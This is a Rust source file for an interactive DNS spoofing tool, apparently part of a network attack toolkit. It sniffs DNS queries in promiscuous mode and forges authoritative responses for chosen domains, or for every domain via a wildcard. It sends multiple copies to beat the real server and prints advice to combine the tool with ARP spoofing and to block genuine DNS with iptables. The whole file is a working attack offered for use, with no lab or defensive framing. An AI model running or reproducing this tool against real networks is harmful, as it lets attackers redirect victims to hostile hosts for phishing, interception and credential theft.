use dialoguer::{theme::ColorfulTheme, Input, Select};
use pnet::datalink::{self, NetworkInterface};
use pnet::packet::ethernet::{EtherTypes, EthernetPacket, MutableEthernetPacket};
use pnet::packet::ip::{IpNextHeaderProtocols};
use pnet::packet::ipv4::{Ipv4Packet, MutableIpv4Packet};
use pnet::packet::udp::{MutableUdpPacket, UdpPacket};
use pnet::packet::Packet;
use std::collections::HashMap;
use std::fs::File;
use std::io::{BufRead, BufReader};
use std::net::{IpAddr, Ipv4Addr};
use std::sync::{Arc, Mutex};
use std::thread;
use std::time::Duration;

#[derive(Debug, Clone)]
pub struct DnsMapping {
    pub domain: String,
    pub target_ip: Ipv4Addr,
}

#[derive(Debug, Clone)]
pub struct DnsConfig {
    pub interface: Option<NetworkInterface>,
    pub target: Option<Ipv4Addr>, // None means entire network
    pub mappings: Vec<DnsMapping>,
}

impl Default for DnsConfig {
    fn default() -> Self {
        Self {
            interface: None,
            target: None,
            mappings: Vec::new(),
        }
    }
}

pub fn run() {
    let mut config = DnsConfig::default();
    let selections = &["List network settings", "Set network settings", "Configure DNS mappings", "Start", "Back"];

    loop {
        let selection = Select::with_theme(&ColorfulTheme::default())
            .with_prompt("DNS Spoofer Menu")
            .default(0)
            .items(&selections[..])
            .interact()
            .unwrap();

        match selections[selection] {
            "List network settings" => list_network_settings(),
            "Set network settings" => set_network_settings(&mut config),
            "Configure DNS mappings" => configure_mappings(&mut config),
            "Start" => start_dns_spoof(&config),
            "Back" => break,
            _ => unreachable!(),
        }
    }
}

fn list_network_settings() {
    let interfaces = datalink::interfaces();
    
    if interfaces.is_empty() {
        println!("No network interfaces found.");
        return;
    }

    let interface_names: Vec<String> = interfaces
        .iter()
        .map(|iface| format!("{} ({})", iface.name, iface.mac.unwrap_or_default()))
        .collect();

    let selection = Select::with_theme(&ColorfulTheme::default())
        .with_prompt("Select a network interface to view details")
        .default(0)
        .items(&interface_names)
        .interact()
        .unwrap();

    let selected_interface = &interfaces[selection];

    println!("\n--- Interface Details: {} ---", selected_interface.name);
    if let Some(mac) = selected_interface.mac {
        println!("MAC Address: {}", mac);
    } else {
        println!("MAC Address: N/A");
    }
    
    println!("Index: {}", selected_interface.index);
    
    // Decode Flags
    let flags = selected_interface.flags;
    let mut flag_strs = Vec::new();
    if (flags & 1) != 0 { flag_strs.push("UP"); }
    if (flags & 2) != 0 { flag_strs.push("BROADCAST"); }
    if (flags & 8) != 0 { flag_strs.push("LOOPBACK"); }
    if (flags & 16) != 0 { flag_strs.push("POINTOPOINT"); }
    if (flags & 64) != 0 { flag_strs.push("RUNNING"); }
    if (flags & 256) != 0 { flag_strs.push("PROMISC"); }
    if (flags & 512) != 0 { flag_strs.push("ALLMULTI"); }
    if (flags & 4096) != 0 { flag_strs.push("MULTICAST"); }
    
    println!("Flags: {} ({:b})", flag_strs.join(", "), flags);

    // MTU
    if let Ok(mtu_str) = std::fs::read_to_string(format!("/sys/class/net/{}/mtu", selected_interface.name)) {
        println!("MTU: {}", mtu_str.trim());
    }

    if selected_interface.ips.is_empty() {
        println!("No IP addresses assigned.");
    } else {
        println!("IP Addresses:");
        for ip in &selected_interface.ips {
            println!(" - IP: {}", ip.ip());
            println!("   Prefix: {}", ip.prefix());
            
            if let IpAddr::V4(ipv4) = ip.ip() {
                let prefix_len = ip.prefix();
                let netmask = prefix_to_netmask(prefix_len);
                let network = calculate_network(&ipv4, &netmask);
                let broadcast = calculate_broadcast(&ipv4, &netmask);
                
                println!("   Netmask: {}", netmask);
                println!("   Network: {}", network);
                println!("   Broadcast: {}", broadcast);
            }
        }
    }

    // Try to detect gateway
    if let Some(gateway) = detect_gateway(&selected_interface.name) {
        println!("\nDetected Gateway: {}", gateway);
    }

    // Try to detect DNS servers
    if let Some(dns_servers) = detect_dns_servers() {
        println!("DNS Servers:");
        for dns in dns_servers {
            println!(" - {}", dns);
        }
    }

    println!();
}

fn set_network_settings(config: &mut DnsConfig) {
    let mode_options = vec!["Manual configuration", "Auto-detect settings"];
    
    let mode_selection = Select::with_theme(&ColorfulTheme::default())
        .with_prompt("Configuration mode")
        .default(0)
        .items(&mode_options[..])
        .interact()
        .unwrap();

    match mode_options[mode_selection] {
        "Manual configuration" => manual_configuration(config),
        "Auto-detect settings" => auto_configuration(config),
        _ => unreachable!(),
    }
}

fn manual_configuration(config: &mut DnsConfig) {
    let interfaces = datalink::interfaces();
    
    if interfaces.is_empty() {
        println!("No network interfaces found.");
        return;
    }

    let interface_names: Vec<String> = interfaces
        .iter()
        .map(|iface| format!("{} ({})", iface.name, iface.mac.unwrap_or_default()))
        .collect();

    let selection = Select::with_theme(&ColorfulTheme::default())
        .with_prompt("Select network interface")
        .default(0)
        .items(&interface_names)
        .interact()
        .unwrap();

    config.interface = Some(interfaces[selection].clone());

    // Ask for target mode
    let target_mode = vec!["Specific target", "Entire network"];
    let target_selection = Select::with_theme(&ColorfulTheme::default())
        .with_prompt("DNS spoofing target")
        .default(0)
        .items(&target_mode[..])
        .interact()
        .unwrap();

    match target_mode[target_selection] {
        "Specific target" => {
            let target_ip: String = Input::new()
                .with_prompt("Enter target IP address")
                .interact()
                .unwrap();
            
            match target_ip.parse::<Ipv4Addr>() {
                Ok(ip) => config.target = Some(ip),
                Err(_) => {
                    println!("Invalid IP address format.");
                    return;
                }
            }
        }
        "Entire network" => {
            config.target = None;
        }
        _ => unreachable!(),
    }

    println!("\n=== Configuration Summary ===");
    println!("Interface: {}", config.interface.as_ref().unwrap().name);
    match config.target {
        Some(ip) => println!("Target: {} (specific)", ip),
        None => println!("Target: Entire network"),
    }
    println!();
}

fn auto_configuration(config: &mut DnsConfig) {
    let interfaces = datalink::interfaces();
    let active_interfaces: Vec<_> = interfaces
        .iter()
        .filter(|iface| {
            !iface.ips.is_empty() &&
            !iface.name.starts_with("lo") &&
            (iface.flags & 1) != 0 && // UP
            (iface.flags & 64) != 0    // RUNNING
        })
        .collect();

    if active_interfaces.is_empty() {
        println!("No active network interfaces found.");
        return;
    }

    let interface_names: Vec<String> = active_interfaces
        .iter()
        .map(|iface| {
            let ipv4s: Vec<_> = iface.ips.iter()
                .filter_map(|ip| {
                    if let IpAddr::V4(ipv4) = ip.ip() {
                        Some(ipv4.to_string())
                    } else {
                        None
                    }
                })
                .collect();
            format!("{} ({})", iface.name, ipv4s.join(", "))
        })
        .collect();

    let selection = Select::with_theme(&ColorfulTheme::default())
        .with_prompt("Select network interface")
        .default(0)
        .items(&interface_names)
        .interact()
        .unwrap();

    config.interface = Some((*active_interfaces[selection]).clone());
    config.target = None; // Entire network

    println!("\n=== Auto-Configuration Summary ===");
    println!("Interface: {}", config.interface.as_ref().unwrap().name);
    println!("Target: Entire network (all DNS queries intercepted)");
    println!();
}

fn configure_mappings(config: &mut DnsConfig) {
    loop {
        println!("\n=== Current DNS Mappings ===");
        if config.mappings.is_empty() {
            println!("No mappings configured.");
        } else {
            for (idx, mapping) in config.mappings.iter().enumerate() {
                println!("{}. {} -> {}", idx + 1, mapping.domain, mapping.target_ip);
            }
        }
        println!();

        let options = vec!["Add mapping", "Remove mapping", "Clear all mappings", "Back"];
        let selection = Select::with_theme(&ColorfulTheme::default())
            .with_prompt("DNS Mapping Configuration")
            .default(0)
            .items(&options[..])
            .interact()
            .unwrap();

        match options[selection] {
            "Add mapping" => {
                let mapping_mode = vec![
                    "Redirect to IP address",
                    "Redirect to another domain (uses system DNS for resolution)",
                    "Wildcard (catch-all)"
                ];
                
                let mode_selection = Select::with_theme(&ColorfulTheme::default())
                    .with_prompt("Mapping type")
                    .default(0)
                    .items(&mapping_mode[..])
                    .interact()
                    .unwrap();

                match mapping_mode[mode_selection] {
                    "Redirect to IP address" => {
                        let domain: String = Input::new()
                            .with_prompt("Enter domain name (e.g., example.com)")
                            .interact()
                            .unwrap();
                        
                        let target_ip: String = Input::new()
                            .with_prompt("Enter target IP address")
                            .interact()
                            .unwrap();
                        
                        match target_ip.parse::<Ipv4Addr>() {
                            Ok(ip) => {
                                config.mappings.push(DnsMapping {
                                    domain: domain.to_lowercase(),
                                    target_ip: ip,
                                });
                                println!("Mapping added: {} -> {}", domain, ip);
                            }
                            Err(_) => println!("Invalid IP address format."),
                        }
                    }
                    "Redirect to another domain (uses system DNS for resolution)" => {
                        let domain: String = Input::new()
                            .with_prompt("Enter source domain name")
                            .interact()
                            .unwrap();
                        
                        let target_domain: String = Input::new()
                            .with_prompt("Enter target domain name")
                            .interact()
                            .unwrap();
                        
                        // Resolve target domain to IP
                        println!("Resolving {}...", target_domain);
                        match resolve_domain(&target_domain) {
                            Some(ip) => {
                                config.mappings.push(DnsMapping {
                                    domain: domain.to_lowercase(),
                                    target_ip: ip,
                                });
                                println!("Mapping added: {} -> {} ({})", domain, target_domain, ip);
                            }
                            None => println!("Failed to resolve target domain."),
                        }
                    }
                    "Wildcard (catch-all)" => {
                        let target_ip: String = Input::new()
                            .with_prompt("Enter target IP for all unmatched domains")
                            .interact()
                            .unwrap();
                        
                        match target_ip.parse::<Ipv4Addr>() {
                            Ok(ip) => {
                                config.mappings.push(DnsMapping {
                                    domain: "*".to_string(),
                                    target_ip: ip,
                                });
                                println!("Wildcard mapping added: * -> {}", ip);
                            }
                            Err(_) => println!("Invalid IP address format."),
                        }
                    }
                    _ => unreachable!(),
                }
            }
            "Remove mapping" => {
                if config.mappings.is_empty() {
                    println!("No mappings to remove.");
                    continue;
                }
                
                let mapping_list: Vec<String> = config.mappings
                    .iter()
                    .map(|m| format!("{} -> {}", m.domain, m.target_ip))
                    .collect();
                
                let selection = Select::with_theme(&ColorfulTheme::default())
                    .with_prompt("Select mapping to remove")
                    .default(0)
                    .items(&mapping_list)
                    .interact()
                    .unwrap();
                
                let removed = config.mappings.remove(selection);
                println!("Removed mapping: {} -> {}", removed.domain, removed.target_ip);
            }
            "Clear all mappings" => {
                config.mappings.clear();
                println!("All mappings cleared.");
            }
            "Back" => break,
            _ => unreachable!(),
        }
    }
}

fn start_dns_spoof(config: &DnsConfig) {
    if config.interface.is_none() {
        println!("Error: No interface configured. Please set network settings first.");
        return;
    }

    if config.mappings.is_empty() {
        println!("Error: No DNS mappings configured. Please configure at least one mapping.");
        return;
    }

    let interface = config.interface.as_ref().unwrap();
    
    println!("\n=== Starting DNS Spoofing Attack ===");
    println!("Interface: {}", interface.name);
    match config.target {
        Some(ip) => println!("Target: {} (specific)", ip),
        None => println!("Target: Entire network"),
    }
    println!("\nDNS Mappings:");
    for mapping in &config.mappings {
        println!(" - {} -> {}", mapping.domain, mapping.target_ip);
    }
    println!("\n=== Important Notes ===");
    println!("1. DNS spoofing works by racing legitimate DNS servers");
    println!("2. For best results, also run ARP spoofing to intercept traffic");
    println!("3. Consider blocking real DNS traffic with:");
    println!("   sudo iptables -A FORWARD -p udp --dport 53 -j DROP");
    println!("   sudo iptables -A FORWARD -p tcp --dport 53 -j DROP");
    println!("4. To remove rules later:");
    println!("   sudo iptables -D FORWARD -p udp --dport 53 -j DROP");
    println!("   sudo iptables -D FORWARD -p tcp --dport 53 -j DROP");
    println!("\nPress Ctrl+C to stop.\n");

    // Check for root privileges
    if !is_root() {
        println!("Error: Root privileges required for DNS spoofing.");
        println!("Please run with sudo.");
        return;
    }

    // Enable promiscuous mode on interface
    println!("Enabling promiscuous mode on {}...", interface.name);
    let status = std::process::Command::new("ip")
        .args(&["link", "set", &interface.name, "promisc", "on"])
        .status();
    
    if status.is_err() || !status.unwrap().success() {
        println!("Warning: Failed to enable promiscuous mode. May not capture all traffic.");
    } else {
        println!("Promiscuous mode enabled successfully.");
    }

    // Create mapping lookup
    let mappings: Arc<Mutex<HashMap<String, Ipv4Addr>>> = Arc::new(Mutex::new(
        config.mappings.iter()
            .map(|m| (m.domain.clone(), m.target_ip))
            .collect()
    ));

    // Start DNS spoofing
    let interface_name = interface.name.clone();
    let target = config.target;

    thread::spawn(move || {
        spoof_dns(&interface_name, target, mappings);
    });

    // Keep main thread alive
    loop {
        thread::sleep(Duration::from_secs(1));
    }
}

fn spoof_dns(interface_name: &str, target: Option<Ipv4Addr>, mappings: Arc<Mutex<HashMap<String, Ipv4Addr>>>) {
    use pnet::datalink::Channel::Ethernet;
    use pnet::datalink::Config;
    
    let interfaces = datalink::interfaces();
    let interface = interfaces
        .into_iter()
        .find(|iface| iface.name == interface_name)
        .expect("Failed to find interface");

    // Configure channel with promiscuous mode
    let mut config = Config::default();
    config.promiscuous = true;
    
    let (mut tx, mut rx) = match datalink::channel(&interface, config) {
        Ok(Ethernet(tx, rx)) => (tx, rx),
        Ok(_) => panic!("Unsupported channel type"),
        Err(e) => panic!("Failed to create datalink channel: {}", e),
    };

    println!("DNS spoofing started. Listening for DNS queries...");
    println!("Note: For best results, also use ARP spoofing to intercept traffic.");
    println!("DNS spoofing works by racing the legitimate DNS server.\n");

    let mut packet_count = 0;
    let mut dns_query_count = 0;

    loop {
        match rx.next() {
            Ok(packet) => {
                packet_count += 1;
                
                if let Some(ethernet) = EthernetPacket::new(packet) {
                    if ethernet.get_ethertype() == EtherTypes::Ipv4 {
                        if let Some(ipv4) = Ipv4Packet::new(ethernet.payload()) {
                            // Check if it's UDP
                            if ipv4.get_next_level_protocol() == IpNextHeaderProtocols::Udp {
                                if let Some(udp) = UdpPacket::new(ipv4.payload()) {
                                    // Check if it's DNS query (destination port 53)
                                    if udp.get_destination() == 53 {
                                        dns_query_count += 1;
                                        
                                        // Debug: Show we're seeing DNS traffic
                                        if dns_query_count % 10 == 1 {
                                            println!("Stats: {} packets captured, {} DNS queries seen", 
                                                packet_count, dns_query_count);
                                        }
                                        
                                        // Check if we should spoof this target
                                        if let Some(target_ip) = target {
                                            if ipv4.get_source() != target_ip {
                                                continue;
                                            }
                                        }
                                        
                                        // Parse DNS query
                                        if let Some(domain) = parse_dns_query(udp.payload()) {
                                            let mappings_lock = mappings.lock().unwrap();
                                            
                                            // Check for exact match
                                            let response_ip = if let Some(ip) = mappings_lock.get(&domain.to_lowercase()) {
                                                Some(*ip)
                                            } else if let Some(ip) = mappings_lock.get("*") {
                                                // Wildcard match
                                                Some(*ip)
                                            } else {
                                                None
                                            };
                                            
                                            drop(mappings_lock);
                                            
                                            if let Some(spoof_ip) = response_ip {
                                                println!(">>> Spoofing DNS query: {} -> {} (from {})", 
                                                    domain, spoof_ip, ipv4.get_source());
                                                
                                                // Send multiple spoofed responses to win the race
                                                // This increases the chance our response arrives first
                                                for _ in 0..5 {
                                                    send_dns_response(
                                                        &mut tx,
                                                        &ethernet,
                                                        &ipv4,
                                                        &udp,
                                                        &domain,
                                                        spoof_ip
                                                    );
                                                }
                                            }
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
            }
            Err(e) => {
                eprintln!("Error receiving packet: {}", e);
            }
        }
    }
}

fn parse_dns_query(payload: &[u8]) -> Option<String> {
    // Simple DNS query parser
    // DNS header is 12 bytes, then comes the question section
    if payload.len() < 13 {
        return None;
    }

    let mut pos = 12; // Skip DNS header
    let mut domain = String::new();

    while pos < payload.len() {
        let len = payload[pos] as usize;
        if len == 0 {
            break;
        }
        
        pos += 1;
        if pos + len > payload.len() {
            return None;
        }

        if !domain.is_empty() {
            domain.push('.');
        }

        domain.push_str(&String::from_utf8_lossy(&payload[pos..pos + len]));
        pos += len;
    }

    if domain.is_empty() {
        None
    } else {
        Some(domain)
    }
}

fn send_dns_response(
    tx: &mut Box<dyn pnet::datalink::DataLinkSender>,
    orig_ethernet: &EthernetPacket,
    orig_ipv4: &Ipv4Packet,
    orig_udp: &UdpPacket,
    _domain: &str,
    spoof_ip: Ipv4Addr,
) {
    // Build DNS response packet
    let dns_response = build_dns_response(orig_udp.payload(), spoof_ip);
    
    // Calculate packet sizes
    let udp_len = 8 + dns_response.len();
    let ipv4_len = 20 + udp_len;
    let eth_len = 14 + ipv4_len;
    
    let mut eth_buffer = vec![0u8; eth_len];
    
    // Build Ethernet header
    {
        let mut eth_packet = MutableEthernetPacket::new(&mut eth_buffer).unwrap();
        eth_packet.set_destination(orig_ethernet.get_source());
        eth_packet.set_source(orig_ethernet.get_destination());
        eth_packet.set_ethertype(EtherTypes::Ipv4);
    }
    
    // Build IP header
    {
        let mut ipv4_packet = MutableIpv4Packet::new(&mut eth_buffer[14..]).unwrap();
        ipv4_packet.set_version(4);
        ipv4_packet.set_header_length(5);
        ipv4_packet.set_total_length(ipv4_len as u16);
        ipv4_packet.set_ttl(64);
        ipv4_packet.set_next_level_protocol(IpNextHeaderProtocols::Udp);
        ipv4_packet.set_source(orig_ipv4.get_destination());
        ipv4_packet.set_destination(orig_ipv4.get_source());
        
        let checksum = pnet::packet::ipv4::checksum(&ipv4_packet.to_immutable());
        ipv4_packet.set_checksum(checksum);
    }
    
    // Build UDP header and payload
    {
        let mut udp_packet = MutableUdpPacket::new(&mut eth_buffer[34..]).unwrap();
        udp_packet.set_source(53);
        udp_packet.set_destination(orig_udp.get_source());
        udp_packet.set_length(udp_len as u16);
        udp_packet.set_payload(&dns_response);
        
        let checksum = pnet::packet::udp::ipv4_checksum(
            &udp_packet.to_immutable(),
            &orig_ipv4.get_destination(),
            &orig_ipv4.get_source(),
        );
        udp_packet.set_checksum(checksum);
    }
    
    // Send the packet
    tx.send_to(&eth_buffer, None);
}

fn build_dns_response(query: &[u8], spoof_ip: Ipv4Addr) -> Vec<u8> {
    let mut response = Vec::new();
    
    // Copy entire query first
    if query.len() < 12 {
        return response;
    }
    
    response.extend_from_slice(query);
    
    // Preserve Transaction ID (bytes 0-1) - already copied
    
    // Modify DNS header flags for response
    // Byte 2: QR=1 (response), Opcode=0, AA=1 (authoritative), TC=0, RD=1 (recursion desired, copy from query)
    let rd_bit = query[2] & 0x01; // Preserve RD bit from query
    response[2] = 0x84 | rd_bit; // QR=1, Opcode=0, AA=1, TC=0, RD=copy
    
    // Byte 3: RA=1 (recursion available), Z=0, RCODE=0 (no error)
    response[3] = 0x80;
    
    // Set answer count to 1 (bytes 6-7)
    response[6] = 0x00;
    response[7] = 0x01;
    
    // Authority and Additional records count stay 0
    
    // Add answer section
    // Name pointer to question (DNS compression - points to offset 12)
    response.push(0xc0);
    response.push(0x0c);
    
    // Type A (0x0001)
    response.push(0x00);
    response.push(0x01);
    
    // Class IN (0x0001)
    response.push(0x00);
    response.push(0x01);
    
    // TTL (60 seconds - short TTL for spoofed records)
    response.push(0x00);
    response.push(0x00);
    response.push(0x00);
    response.push(0x3c);
    
    // Data length (4 bytes for IPv4)
    response.push(0x00);
    response.push(0x04);
    
    // IP address
    let octets = spoof_ip.octets();
    response.extend_from_slice(&octets);
    
    response
}

// Helper functions

fn prefix_to_netmask(prefix: u8) -> Ipv4Addr {
    let mask: u32 = if prefix == 0 {
        0
    } else {
        !0u32 << (32 - prefix)
    };
    Ipv4Addr::from(mask)
}

fn calculate_network(ip: &Ipv4Addr, netmask: &Ipv4Addr) -> Ipv4Addr {
    let ip_octets = ip.octets();
    let mask_octets = netmask.octets();
    
    Ipv4Addr::new(
        ip_octets[0] & mask_octets[0],
        ip_octets[1] & mask_octets[1],
        ip_octets[2] & mask_octets[2],
        ip_octets[3] & mask_octets[3],
    )
}

fn calculate_broadcast(ip: &Ipv4Addr, netmask: &Ipv4Addr) -> Ipv4Addr {
    let ip_octets = ip.octets();
    let mask_octets = netmask.octets();
    
    Ipv4Addr::new(
        ip_octets[0] | !mask_octets[0],
        ip_octets[1] | !mask_octets[1],
        ip_octets[2] | !mask_octets[2],
        ip_octets[3] | !mask_octets[3],
    )
}

fn detect_gateway(interface_name: &str) -> Option<Ipv4Addr> {
    let route_file = File::open("/proc/net/route").ok()?;
    let reader = BufReader::new(route_file);
    
    for line in reader.lines().skip(1) {
        if let Ok(line) = line {
            let parts: Vec<&str> = line.split_whitespace().collect();
            if parts.len() >= 3 && parts[0] == interface_name {
                if let Ok(gateway_hex) = u32::from_str_radix(parts[2], 16) {
                    if gateway_hex != 0 {
                        return Some(Ipv4Addr::from(gateway_hex.to_le()));
                    }
                }
            }
        }
    }
    None
}

fn detect_dns_servers() -> Option<Vec<String>> {
    let resolv_file = File::open("/etc/resolv.conf").ok()?;
    let reader = BufReader::new(resolv_file);
    let mut dns_servers = Vec::new();
    
    for line in reader.lines() {
        if let Ok(line) = line {
            if line.trim().starts_with("nameserver") {
                if let Some(server) = line.split_whitespace().nth(1) {
                    dns_servers.push(server.to_string());
                }
            }
        }
    }
    
    if dns_servers.is_empty() {
        None
    } else {
        Some(dns_servers)
    }
}

fn resolve_domain(domain: &str) -> Option<Ipv4Addr> {
    use std::process::Command;
    
    let output = Command::new("host")
        .arg("-t")
        .arg("A")
        .arg(domain)
        .output()
        .ok()?;
    
    let stdout = String::from_utf8_lossy(&output.stdout);
    
    for line in stdout.lines() {
        if line.contains("has address") {
            if let Some(ip_str) = line.split_whitespace().last() {
                if let Ok(ip) = ip_str.parse::<Ipv4Addr>() {
                    return Some(ip);
                }
            }
        }
    }
    
    None
}

fn is_root() -> bool {
    unsafe { libc::geteuid() == 0 }
}
